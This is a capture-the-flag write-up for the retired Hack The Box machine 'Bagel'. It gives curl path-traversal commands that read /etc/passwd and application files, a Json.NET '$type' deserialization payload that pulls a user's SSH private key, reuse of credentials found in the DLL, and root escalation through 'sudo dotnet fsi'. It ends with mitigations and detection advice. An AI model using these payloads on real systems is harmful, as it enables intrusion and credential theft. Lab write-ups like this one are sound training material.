---
machine: Bagel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, flask, file-read, dotnet, websocket, json-deserialization, reversing, dotnet-fsi, privesc]
---

# Bagel — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Port `8000` serves a Flask application with file read in `?page=`. It reads `/proc/self/cmdline`, locates `/home/developer/app/app.py` and shows that the site talks over WebSocket to a .NET service on `5000`. The same flaw downloads `/opt/bagel/bin/Debug/net6.0/bagel.dll`; reversing it reveals Json.NET's `TypeNameHandling.Auto`, exploitable with a `$type` object that instantiates `bagel_server.File` and reads arbitrary files. The payload returns `phil`'s SSH key. The DLL also contains `developer`'s password, and that account can run `dotnet` as root: `dotnet fsi` launches commands with root privileges.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,5000,8000 <IP>
```

- `22`: OpenSSH.
- `5000`: .NET WebSocket server.
- `8000`: Flask.

```bash
echo '<IP> bagel.htb' | sudo tee -a /etc/hosts
```

## Enumeration

The `page` parameter concatenates the path without validation:

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../etc/passwd'
curl -o- 'http://bagel.htb:8000/?page=../../../../proc/self/cmdline'
```

The command line reveals the application location:

```text
python3 /home/developer/app/app.py
```

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../home/developer/app/app.py'
```

The code shows the `/orders` route: it opens a WebSocket to `ws://127.0.0.1:5000/` and sends `{"ReadOrder":"orders.txt"}`. The .NET process is located through its `cmdline`:

```bash
curl -o- 'http://bagel.htb:8000/?page=../../../../proc/<PID>/cmdline'
```

```text
dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

## Foothold

The DLL is downloaded with the same file read:

```bash
curl -o bagel.dll 'http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll'
```

dnSpy shows that incoming messages are deserialized with Json.NET and `TypeNameHandling.Auto`. That setting accepts a client-controlled `$type`. The `bagel_server.File` class exposes `ReadFile`, and its setter runs during deserialization:

```json
{"RemoveOrder":{"$type":"bagel_server.File, bagel","ReadFile":"../../../../etc/passwd"}}
```

Connecting to the WebSocket and sending the object:

```bash
wscat -c ws://bagel.htb:5000
```

```text
> {"RemoveOrder":{"$type":"bagel_server.File, bagel","ReadFile":"../../../../home/phil/.ssh/id_rsa"}}
```

The response contains `phil`'s private key, which gives SSH access and `user.txt`.

## Lateral movement

The DLL contains a database connection string with `developer` credentials. That password works on the system:

```bash
su - developer
```

## Privilege escalation

`developer` can run `dotnet` as root without a password:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/dotnet
```

`dotnet fsi` opens the F# interactive shell and launches processes as root:

```bash
sudo dotnet fsi
```

```fsharp
System.Diagnostics.Process.Start("id").WaitForExit();;
```

A project can also be created and run:

```bash
dotnet new console -o /tmp/exploit
cd /tmp/exploit
sudo dotnet run
```

Either path gives a root shell or root execution and access to `/root/root.txt`.

## Evidence

- Reading `/etc/passwd`, `app.py` and `bagel.dll` through `?page=`.
- WebSocket on `5000` and deserialization with `TypeNameHandling.Auto`.
- `bagel_server.File` payload returning `phil`'s SSH key.
- `developer` credentials extracted from the DLL and a successful `su`.
- `sudo dotnet fsi` running `id` as root.

## Lessons learned

- Concatenating paths in a read parameter enables traversal.
- Processes and their `cmdline` reveal internal paths and artifacts.
- `TypeNameHandling.Auto` in Json.NET turns data into attacker-controlled types.
- Connection strings and credentials end up inside binaries and get reused.
- Granting `dotnet` through `sudo` is equivalent to handing out a full shell.

## Mitigations and detection

- Resolve paths against a base directory and reject `..`.
- Do not deserialize dynamic types; use `TypeNameHandling.None` and validate the schema.
- Do not embed credentials in binaries, and rotate them if distributed.
- Avoid `sudo` rules on interpreters and tools that execute code.
- Monitor `dotnet fsi`, `dotnet run` and child processes of `sudo`.
- Alert on JSON payloads carrying `$type` on internal WebSockets.

## References

- [0xdf — Bagel](https://0xdf.gitlab.io/2023/06/03/htb-bagel.html)
- [Hack The Box — Bagel](https://app.hackthebox.com/machines/bagel)
- [Knowledge — .NET deserialization](../../../knowledge/windows/dotnet-deserialization.md)
- [Knowledge — dnSpy](../../../knowledge/reversing/dotnet-dnspy.md)
